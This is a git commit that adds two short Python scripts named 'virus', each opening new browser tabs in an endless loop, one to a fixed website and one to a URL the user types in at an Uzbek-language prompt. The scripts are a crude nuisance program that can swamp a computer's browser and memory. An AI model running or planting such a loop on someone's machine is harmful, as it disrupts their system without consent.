a0b9c56016724073ab4519b3694334039b68defd
Herzeg.uz <110915492+Herzeg137@users.noreply.github.com>
2023-01-12 14:50:59 +0500

    Add files via upload

---
+++ OLV/virus.py
@@ -0,0 +1,5 @@
+import webbrowser
+
+while True:
+
+    webbrowser.open_new_tab('https://metallplaza.netlify.app/')
---
+++ OLV/virus_with_input.py
@@ -0,0 +1,6 @@
+import webbrowser
+a = input('Iltimos web site linkini kiriting: ')
+
+while True:
+
+    webbrowser.open_new_tab(a)
